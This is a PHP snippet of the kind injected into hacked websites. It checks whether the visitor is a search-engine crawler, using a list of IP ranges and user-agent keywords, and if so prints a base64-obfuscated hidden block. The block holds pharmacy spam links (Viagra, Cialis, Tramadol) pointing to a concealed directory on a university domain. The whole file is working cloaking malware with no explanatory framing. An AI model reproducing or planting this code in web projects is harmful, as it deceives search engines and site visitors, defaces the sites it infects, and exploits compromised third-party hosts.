<?php /* fd4408e54fcb3b9baaae54f59ed34365 */
	$stop_ips_masks = array(
		"66\.249\.[6-9][0-9]\.[0-9]+",	// Google	NetRange:   66.249.64.0 - 66.249.95.255
		"70\.91\.180\.25", 				// Google 
		"65\.5[2-5]\.[0-9]+\.[0-9]+",	// MSN		NetRange:   65.52.0.0 - 65.55.255.255,
		"74\.6\.[0-9]+\.[0-9]+",		// Yahoo	NetRange:   74.6.0.0 - 74.6.255.255
		"67\.195\.[0-9]+\.[0-9]+",		// Yahoo#2	NetRange:   67.195.0.0 - 67.195.255.255
		"93\.172\.94\.227",				// MacFinder
		"212\.100\.250\.218",			// Wells Search II
		"71\.165\.223\.134",			// Indy Library
		"65\.93\.62\.242",
		"74\.193\.246\.129",
		"213\.144\.15\.38",
		"195\.92\.229\.2",
		"70\.50\.189\.191",
		"218\.28\.88\.99",
		"165\.160\.2\.20",
		"89\.122\.224\.230",
		"66\.230\.175\.124",
		"218\.18\.174\.27",
		"65\.33\.87\.94",
		"67\.210\.111\.241",
		"81\.135\.175\.70",
		"64\.69\.34\.134",
		"89\.149\.253\.169"	
	); $is_bot = false;
	$stop_agents_masks = array("http", "google", "slurp", "msnbot", "bot", "crawler", "spider", "robot", "HttpClient", "curl", "PHP", "Indy Library", "WordPress");  
	$_SERVER["HTTP_USER_AGENT"] = preg_replace("|User.Agent\:[\s ]?|i", "", @$_SERVER["HTTP_USER_AGENT"]);
	foreach ($stop_ips_masks as $stop_ip_mask) if(eregi("^{$stop_ip_mask}$", @$_SERVER['REMOTE_ADDR'])) $is_bot = true;
	foreach ($stop_agents_masks as $stop_agents_mask) if(eregi($stop_agents_mask, @$_SERVER["HTTP_USER_AGENT"]) !== false) $is_bot = true;
	if($is_bot and !defined("fd4408e54fcb3b9baaae54f59ed34365_INCLUDED")){ echo @base64_decode("PGRpdiBzdHlsZT0nd2lkdGg6MTUwcHg7IGhlaWdodDoxcHg7cGFkZGluZzowcHg7Zm9udDoxMXB4IFRhaG9tYTtvdmVyZmxvdzpoaWRkZW47Jz48YSBocmVmPSJodHRwOi8vd3d3LnVjbC5hYy51ay9jYXN0bGUvZmlsZXMvLkVEc3RvcmUvZ2VuZXJpYy1jaWFsaXMtcHJvZmVzc2lvbmFsLmh0bWwiPkdlbmVyaWMgQ2lhbGlzIFByb2Zlc3Npb25hbCBQaWxsczwvYT4NCjxhIGhyZWY9Imh0dHA6Ly93d3cudWNsLmFjLnVrL2Nhc3RsZS9maWxlcy8uRURzdG9yZS9nZW5lcmljLXZpYWdyYS1zdXBlci1hY3RpdmUtcGlsbHMuaHRtbCI+R2VuZXJpYyBWaWFncmEgU3VwZXIgQWN0aXZlIFBpbGxzPC9hPg0KPGEgaHJlZj0iaHR0cDovL3d3dy51Y2wuYWMudWsvY2FzdGxlL2ZpbGVzLy5FRHN0b3JlL3NvbWEtcGlsbHMuaHRtbCI+QnV5IEdlbmVyaWMgU29tYSAzNTAgbWc8L2E+PGEgaHJlZj0iaHR0cDovL3d3dy51Y2wuYWMudWsvY2FzdGxlL2ZpbGVzLy5FRHN0b3JlL2dlbmVyaWMtdmlhZ3JhLXNvZnQtdGFicy5odG1sIj5HZW5lcmljIFZpYWdyYSBTb2Z0IFRhYnMgMTAwIG1nPC9hPg0KPGEgaHJlZj0iaHR0cDovL3d3dy51Y2wuYWMudWsvY2FzdGxlL2ZpbGVzLy5FRHN0b3JlL2dlbmVyaWMtY2lhbGlzLXNvZnQtdGFicy5odG1sIj5CdXkgR2VuZXJpYyBDaWFsaXMgU29mdCBUYWJzIFBpbGxzPC9hPg0KPGEgaHJlZj0iaHR0cDovL3d3dy51Y2wuYWMudWsvY2FzdGxlL2ZpbGVzLy5FRHN0b3JlL2xldml0cmEtcGlsbHMuaHRtbCI+QnV5IEdlbmVyaWMgTGV2aXRyYSAyMCBtZzwvYT4NCjxhIGhyZWY9Imh0dHA6Ly93d3cudWNsLmFjLnVrL2Nhc3RsZS9maWxlcy8uRURzdG9yZS90cmFtYWRvbC1waWxscy5odG1sIj5CdXkgR2VuZXJpYyBUcmFtYWRvbCBwaWxsczwvYT4NCjxhIGhyZWY9Imh0dHA6Ly93d3cudWNsLmFjLnVrL2Nhc3RsZS9maWxlcy8uRURzdG9yZS9nZW5lcmljLXZpYWdyYS1waWxscy5odG1sIj5CdXkgR2VuZXJpYyBWaWFncmEgMTAwIG1nIE9ubGluZTwvYT4NCjxhIGhyZWY9Imh0dHA6Ly93d3cudWNsLmFjLnVrL2Nhc3RsZS9maWxlcy8uRURzdG9yZS9nZW5lcmljLWNpYWxpcy1waWxscy5odG1sIj5CdXkgR2VuZXJpYyBDaWFsaXMgUGlsbHM8L2E+DQo8YSBocmVmPSJodHRwOi8vd3d3LnVjbC5hYy51ay9jYXN0bGUvZmlsZXMvLkVEc3RvcmUvZ2VuZXJpYy1jaWFsaXMtc3VwZXItYWN0aXZlLXBpbGxzLmh0bWwiPkdlbmVyaWMgQ2lhbGlzIFN1cGVyIEFjdGl2ZTwvYT4NCjxhIGhyZWY9Imh0dHA6Ly93d3cudWNsLmFjLnVrL2Nhc3RsZS9maWxlcy8uRURzdG9yZS9nZW5lcmljLXZpYWdyYS1wcm9mZXNzaW9uYWwtcGlsbHMuaHRtbCI+R2VuZXJpYyBWaWFncmEgUHJvZmVzc2lvbmFsIFBpbGxzPC9hPg0KPC9kaXY+"); define("fd4408e54fcb3b9baaae54f59ed34365_INCLUDED",1);}
/* fd4408e54fcb3b9baaae54f59ed34365 */ ?>
